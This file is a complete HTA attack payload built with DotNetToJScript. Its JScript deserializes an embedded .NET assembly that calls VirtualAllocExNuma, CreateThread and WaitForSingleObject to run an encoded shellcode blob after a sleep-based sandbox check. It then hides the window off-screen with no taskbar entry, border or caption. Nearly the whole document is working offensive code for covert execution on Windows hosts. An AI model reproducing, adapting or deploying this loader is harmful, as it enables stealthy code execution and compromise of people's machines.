<html>
<head>
<script language="JScript">

<!-- ADD output from DotNetToJScript here. -->
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABoAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMASynRaAAAAAAA"+
"AAAA4AAiIAsBMAAAEAAAAAgAAAAAAABuLAAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAHCwA"+
"AE8AAAAAQAAADAQAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAOQqAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAAQDwAAACAAAAAQAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAADAQAAABA"+
"AAAABgAAABIAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAYAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFAsAAAAAAAASAAAAAIABQA4IQAArAkAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAGALUAAAAB"+
"AAARAigPAAAKKBAAAAoKINAHAAAoAQAABigQAAAKDRIDBigRAAAKEwQSBCgSAAAKIwAAAAAAAPg/"+
"NAEqH0ALFSgTAAAKfhQAAAogABAAACAAMAAABxYoAgAABgwWEwUrGn4BAAAEEQV+AQAABBEFkR9h"+
"YdKcEQUXWBMFEQV+AQAABI5pMtt+AQAABBYIfgEAAASOaSgVAAAKfhQAAAoWCH4UAAAKFn4UAAAK"+
"KAMAAAYVKAQAAAYmKiIDKBYAAAomKm4glwIAAI0XAAABJdACAAAEKBcAAAqAAQAABCoAAEJTSkIB"+
"AAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAGADAAAjfgAAzAMAAGQEAAAjU3RyaW5ncwAA"+
"AAAwCAAABAAAACNVUwA0CAAAEAAAACNHVUlEAAAARAgAAGgBAAAjQmxvYgAAAAAAAAACAAABV5UC"+
"NAkCAAAA+gEzABYAAAEAAAAaAAAABAAAAAIAAAAHAAAAEAAAABcAAAAPAAAAAQAAAAEAAAACAAAA"+
"BAAAAAEAAAABAAAAAgAAAAEAAAAAALICAQAAAAAABgDkAWUDBgBRAmUDBgAxARMDDwCFAwAABgBZ"+
"AdYCBgDHAdYCBgCoAdYCBgA4AtYCBgAEAtYCBgAdAtYCBgBwAdYCBgBFAUYDBgAjAUYDBgCLAdYC"+
"BgATBMYCBgDkAMYCBgDNAsYCBgAIAWUDBgDtAMYCBgAMA8YCBgCQAkYDCgDcAxMDBgBvAsYCBgC3"+
"A2UDBgBIBMYCBgDJAMYCAAAAAGAAAAAAAAEAAQABABAAxgMAAD0AAQABAAABAABpAAAAPQACAAgA"+
"FQEAAAEAAABNAAMACAARAIcCXgAzAR8AYgAAAAAAgACRIO0CZgABAAAAAACAAJEgiABrAAIAAAAA"+
"AIAAkSCvAHUACAAAAAAAgACRIAYEfwAOAFAgAAAAAIYY/wIGABAAESEAAAAAhgDZAxAAEAAaIQAA"+
"AACRGAUDhQARAAAAAQA3AwAAAQDQAwAAAgDkAwAAAwCAAgAABAD3AAAABQAaBAAABgC8AAAAAQCU"+
"AwAAAgB0AgAAAwDuAwAABADzAgAABQCnAwAABgCkAAAAAQDcAAAAAgA3AwAAAQCLAgkA/wIBABEA"+
"/wIGABkA/wIKACkA/wIQADEA/wIQADkA/wIQAEEA/wIQAEkA/wIQAFEA/wIQAFkA/wIQAGEA/wIV"+
"AGkA/wIQAHEA/wIQAJEA/wIGAHkA/wIGAIEANgQmAIEA/QMrAIkAJgMyAKEAJAQ2AKEA6AI7AKkA"+
"XgQ+ALEAMARHAMEAPgRNAC4ACwCJAC4AEwCSAC4AGwCxAC4AIwC6AC4AKwDPAC4AMwD5AC4AOwD5"+
"AC4AQwC6AC4ASwD/AC4AUwD5AC4AWwD5AC4AYwAkAS4AawBOAUMAWwBbAWMAcwBhAQEAlwIAAAQA"+
"GgClApgCAAEDAO0CAQBBAQUAiAABAEYBBwCvAAIAQAEJAAYEAQB4LAAAAgAEgAAAAQAAAAAAAAAA"+
"AAAAAABOBAAAAgAAAAAAAAAAAAAAVQCbAAAAAAACAAAAAAAAAAAAAABVAMYCAAAAAAQAAwAAAABf"+
"X1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTY2MwA3QkM5NEQ0N0VDN0M2QzBERDQzQTQ2OUY2NTYz"+
"Rjk2MjI2QURDQjkwMDBGRjQyOThBNkI1MkUzNTREOUM1MjQ4ADxNb2R1bGU+ADxQcml2YXRlSW1w"+
"bGVtZW50YXRpb25EZXRhaWxzPgBWaXJ0dWFsQWxsb2NFeE51bWEAbXNjb3JsaWIAbHBUaHJlYWRJ"+
"ZABDcmVhdGVUaHJlYWQAbm5kUHJlZmVycmVkAFJ1bnRpbWVGaWVsZEhhbmRsZQBoSGFuZGxlAERh"+
"dGVUaW1lAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25UeXBlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmli"+
"dXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRl"+
"AEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1i"+
"bHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNz"+
"ZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRl"+
"AEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3Nl"+
"bWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBk"+
"d1N0YWNrU2l6ZQBkd1NpemUAYnVmAHBhdGgATWFyc2hhbABLZXJuZWwzMi5kbGwAa2VybmVsMzIu"+
"ZGxsAEV4YW1wbGVBc3NlbWJseS5kbGwAU3lzdGVtAFRpbWVTcGFuAFN5c3RlbS5SZWZsZWN0aW9u"+
"AFplcm8AU2xlZXAAbHBQYXJhbWV0ZXIALmN0b3IALmNjdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25v"+
"c3RpY3MAZ2V0X1RvdGFsU2Vjb25kcwBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uUnVudGltZS5JbnRl"+
"cm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2Rl"+
"cwBscFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFJ1bnRpbWVIZWxwZXJzAFRlc3RD"+
"bGFzcwBoUHJvY2VzcwBSdW5Qcm9jZXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBTdWJ0cmFj"+
"dABXYWl0Rm9yU2luZ2xlT2JqZWN0AGZsUHJvdGVjdABvcF9FeHBsaWNpdABTdGFydABnZXRfTm93"+
"AEluaXRpYWxpemVBcnJheQBFeGFtcGxlQXNzZW1ibHkAQ29weQAAAAAAAKgxLywR9k1NhzXrlusE"+
"7gMABCABAQgDIAABBSABARERBCABAQ4EIAEBAgsHBhFBCRgRQRFFCAQAABFBBiABEUURQQMgAA0E"+
"AAEYCAIGGAgABAEdBQgYCAUAARJZDgcAAgESZRFpCLd6XFYZNOCJAwYdBQMGERAEAAEBCQkABhgY"+
"GAkJCQkJAAYYGAkYGAkYBQACCRgJAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlv"+
"blRocm93cwEIAQACAAAAAAAUAQAPRXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJs"+
"eSBmb3IgRG90TmV0VG9KU2NyaXB0AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNo"+
"YXcgMjAxNwAAKQEAJDU2NTk4ZjFjLTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEu"+
"MC4wLjAAAAUBAAEAAAQBAAAAAAAAAAAASynRaAAAAAACAAAAHAEAAAArAAAADQAAUlNEU9Kx3Koa"+
"c1ZEpewx2tz1C7gBAAAAQzpcVXNlcnNcam9lbF9cRG93bmxvYWRzXERvdE5ldFRvSlNjcmlwdC1t"+
"YXN0ZXJcRG90TmV0VG9KU2NyaXB0LW1hc3RlclxFeGFtcGxlQXNzZW1ibHlcb2JqXFJlbGVhc2Vc"+
"RXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABELAAAAAAAAAAA"+
"AABeLAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUCwAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBt"+
"c2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAJ2J7mFhYQFQswXqM1HohOozbeozdVCebtYrR+oTSVCh"+
"zV0AHWNNQaCubGCmKBSOM+ozcTbqI11gseohGeShFS1gsTHqKXnqOUFgsuSoFV0oUJ7qVepgt1Ch"+
"oK5szWCmWYEUlWIcmVocRRSBOeo5RWCyB+ptKuo5fWCy6mXqYLHoJUVFOjoAODswnoE5Pjvqc4jh"+
"np6ePOClEZ+enuw1RQEzCdArCtCetOwlRQGIPWFhYT/sGQE2MVC6MjIJZWFhaTIyMjcyCRitXuee"+
"tOShFTELIeGmcTIyULoynlYJz+bzXp60NQkWYGFhilExnlYJpLnchp60MjIy6i1FnTAyMp5WCafN"+
"+xietIgHYGFhif6enp4TFA8FDQ1SU2GJqp6enp2J7mFhYQHohFCzBeozUeozbeozdW7WK0fqE0lQ"+
"nlChzV0AHWNNQaCubGCmKBSOMzbqM3HqI11gseohGeShFS1gseo5QeopeTFgsuSoFV1QnijqVepg"+
"t1ChoK5szWCmWYEUlWIcmVocRRSBOeo5RWCyB+ptKuo5fWCy6mXqYLHoJUVFOjoAODswnoE5Pjvq"+
"c4jhnp6ePAlSU2FhCRYSUz41CS0WR2boiZ6x2fFgYWFIpTUxCUjhCmGetAtrCaHJUFcJY2Fg2uiH"+
"MTExMSExITEJi26+gZ609gtxNzYJ+MQVAJ605KEVa54vaRSNiQZhYWELYQtlNzYJY7ipPp604plh"+
"H1fqVwshCWFxYWE3C2EJOcUyhJ608jILYTcyNgljuKk+nrTimWEcSTkJYSFhYQthMQlqTm5RnrQ2"+
"CRQPLACetD8/nm1FbuQRnp6eiPqenp5gokinFKCi2oF8S2sJx/Tc/J60XWcda+GagRRk2iZyEw4L"+
"YTKetAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEA"+
"AQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAAVgBT"+
"AF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8A"+
"AAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAA"+
"ACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBnAEYA"+
"aQBsAGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0AZQBu"+
"AHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0AE4A"+
"ZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAA"+
"AAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBwAGwA"+
"ZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAw"+
"AC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABsAGUA"+
"QQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBo"+
"AHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3ACAA"+
"MgAwADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABQ"+
"ABQAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBBAHMA"+
"cwBlAG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAARQB4"+
"AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMA"+
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBp"+
"AG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAIAAADAAAAHA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}

window.resizeTo(0, 0);
window.moveTo(-32000, -32000);
</script>
<hta:application 
    showInTaskbar="no" 
    border="none" 
    caption="no" 
    maximizeButton="no" 
    minimizeButton="no" 
    sysMenu="no" 
    scroll="no"
/>
</head>
<body onload="window.blur();">
</body>
</html>